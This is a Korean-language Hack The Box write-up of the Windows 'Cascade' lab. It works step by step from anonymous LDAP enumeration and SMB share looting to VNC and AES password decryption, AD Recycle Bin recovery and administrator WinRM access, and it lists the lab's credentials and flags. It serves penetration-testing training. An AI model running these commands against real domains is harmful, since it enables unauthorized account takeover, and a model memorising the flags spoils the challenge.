# HTB - Cascade

## Machine Info

|항목|내용|
|---|---|
|OS|Windows|
|Difficulty|Medium|
|IP|10.129.193.223|
|User flag|`db000d4ec61fa5d8cc4bd8b9f6921579`|
|Root flag|`45e6b1922c427df6c566e6bc3c8f51da`|

## Tags

#htb #windows #active-directory #ldap #smb #vnc #sqlite #dotnet #ad-recycle-bin

---

## Attack Path Overview

```
LDAP Anonymous Bind
→ r.thompson (cascadeLegacyPwd in LDAP)
→ SMB Data share → VNC Install.reg (s.smith)
→ WinRM s.smith (user flag)
→ Audit$ share → CascAudit.exe + Audit.db → ArkSvc (AES decrypt)
→ WinRM arksvc → AD Recycle Bin → TempAdmin cascadeLegacyPwd
→ Administrator (root flag)
```

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate 10000 10.129.193.223
```

**Open ports:**

|Port|Service|
|---|---|
|53|DNS|
|88|Kerberos|
|135|MSRPC|
|139|NetBIOS|
|389|LDAP|
|445|SMB|
|636|LDAPS|
|3268|GlobalCatalog LDAP|
|5985|WinRM|

전형적인 Windows Domain Controller 구성.

### LDAP Anonymous Bind

```bash
# 도메인 유저 열거
ldapsearch -x -H ldap://10.129.193.223 -b "DC=cascade,DC=local" \
  "(&(objectClass=user)(cn=*Ryan*))" sAMAccountName

# r.thompson의 모든 attribute 덤프
ldapsearch -x -H ldap://10.129.193.223 -b "DC=cascade,DC=local" \
  "(&(objectClass=user)(sAMAccountName=r.thompson))" \
  sAMAccountName cascadeLegacyPwd pwdLastSet lastLogon userAccountControl
```

**결과:** `cascadeLegacyPwd: clk0bjVldmE=`

```bash
echo "clk0bjVldmE=" | base64 -d
# → rY4n5eva
```

**Credential #1:** `r.thompson : rY4n5eva`

---

## Foothold — r.thompson via SMB

```bash
smbclient -L //10.129.193.223 -U "cascade.local\\r.thompson%rY4n5eva"
```

Non-default share: **`Data`**, `Audit$` (접근 불가)

```bash
smbclient //10.129.193.223/Data -U "cascade.local\\r.thompson%rY4n5eva"
smb: \> recurse ON
smb: \> ls
```

**관심 파일:**

- `\IT\Temp\s.smith\VNC Install.reg`
- `\IT\Email Archives\Meeting_Notes_June_2018.html`
- `\IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log`

```bash
smbclient //10.129.193.223/Data -U "cascade.local\\r.thompson%rY4n5eva" \
  -c 'get "IT\Temp\s.smith\VNC Install.reg"'
smbclient //10.129.193.223/Data -U "cascade.local\\r.thompson%rY4n5eva" \
  -c 'get "IT\Email Archives\Meeting_Notes_June_2018.html"'
```

### VNC Password Decrypt

`VNC Install.reg` 내용:

```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

VNC는 DES CBC로 암호화, 고정 키 `e84ad660c4721ae0` 사용:

```bash
python3 -c "
from Cryptodome.Cipher import DES
import binascii
key = binascii.unhexlify('e84ad660c4721ae0')
cipher = DES.new(key, DES.MODE_CBC, iv=b'\x00'*8)
print(cipher.decrypt(binascii.unhexlify('6bcf2a4b6e5aca0f')))
"
# → sT333ve2
```

**Credential #2:** `s.smith : sT333ve2`

### Meeting Notes 힌트

`Meeting_Notes_June_2018.html`에서 중요한 힌트 발견:

> _"Username is TempAdmin (password is the same as the normal admin account password)"_

→ TempAdmin = Administrator와 동일한 패스워드!

---

## User Flag — s.smith via WinRM

```bash
evil-winrm -i 10.129.193.223 -u s.smith -p sT333ve2
```

```powershell
type C:\Users\s.smith\Desktop\user.txt
# db000d4ec61fa5d8cc4bd8b9f6921579
```

### Logon Script 확인

```powershell
net user s.smith /domain
# Logon script: MapAuditDrive.vbs
```

→ s.smith는 `Audit$` 공유에 접근 가능!

---

## Lateral Movement — s.smith → arksvc

### Audit$ Share 탐색

```bash
smbclient //10.129.193.223/Audit$ -U "cascade.local\\s.smith%sT333ve2"
smb: \> recurse ON
smb: \> ls
```

**발견 파일:**

- `CascAudit.exe` (.NET 실행파일)
- `CascCrypto.dll` (AES 암호화 라이브러리)
- `DB\Audit.db` (SQLite DB)

```bash
smbclient //10.129.193.223/Audit$ -U "cascade.local\\s.smith%sT333ve2" \
  -c 'get DB/Audit.db /tmp/Audit.db; get CascAudit.exe; get CascCrypto.dll'
```

### SQLite DB에서 암호화된 패스워드 추출

```bash
sqlite3 /tmp/Audit.db ".tables"
# DeletedUserAudit  Ldap  Misc

sqlite3 /tmp/Audit.db "select * from Ldap;"
# 1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

### AES 복호화

`CascAudit.exe` 디컴파일로 AES 키/IV 확인:

- Key: `c4scadek3y654321`
- IV: `1tdyjCbY1Ix49842`

```bash
python3 -c "
from Cryptodome.Cipher import AES
import base64
key = b'c4scadek3y654321'
iv  = b'1tdyjCbY1Ix49842'
ct  = base64.b64decode('BQO5l5Kj9MdErXx6Q6AGOw==')
cipher = AES.new(key, AES.MODE_CBC, iv)
print(cipher.decrypt(ct))
"
# → w3lc0meFr31nd
```

**Credential #3:** `arksvc : w3lc0meFr31nd`

---

## Privilege Escalation — arksvc → Administrator

### WinRM 접속

```bash
evil-winrm -i 10.129.193.223 -u arksvc -p w3lc0meFr31nd
```

### AD Recycle Bin 권한 확인

```powershell
whoami /groups
# CASCADE\AD Recycle Bin → Enabled
```

### 삭제된 TempAdmin 계정 복구

```powershell
Get-ADObject -Filter {SamAccountName -eq "TempAdmin"} \
  -IncludeDeletedObjects -Properties * | select SamAccountName, cascadeLegacyPwd
```

**결과:**

```
SamAccountName  cascadeLegacyPwd
--------------  ----------------
TempAdmin       YmFDVDNyMWFOMDBkbGVz
```

```bash
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
# → baCT3r1aN00dles
```

Meeting Notes에서 확인했듯 TempAdmin = Administrator 동일 패스워드!

**Credential #4:** `Administrator : baCT3r1aN00dles`

---

## Root Flag

```bash
evil-winrm -i 10.129.193.223 -u Administrator -p baCT3r1aN00dles
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
# 45e6b1922c427df6c566e6bc3c8f51da
```

---

## Key Takeaways

- **LDAP anonymous bind** → 비표준 attribute(`cascadeLegacyPwd`)에 평문 패스워드 저장 가능
- **VNC 레지스트리** → DES CBC 고정 키로 패스워드 복호화 가능 (키: `e84ad660c4721ae0`)
- **.NET 리버싱** → `CascAudit.exe`에 하드코딩된 AES 키로 DB 패스워드 복호화
- **AD Recycle Bin** → 삭제된 AD 객체에도 attribute 보존됨 → `cascadeLegacyPwd` 회수 가능
- **정보 재사용** → "TempAdmin = Administrator 동일 패스워드" 힌트가 이메일에 평문으로 존재

## Credentials Summary

| User          | Password        | 출처                                |
| ------------- | --------------- | --------------------------------- |
| r.thompson    | rY4n5eva        | LDAP cascadeLegacyPwd (Base64)    |
| s.smith       | sT333ve2        | VNC Install.reg (DES decrypt)     |
| arksvc        | w3lc0meFr31nd   | Audit.db (AES decrypt)            |
| Administrator | baCT3r1aN00dles | AD Recycle Bin TempAdmin (Base64) |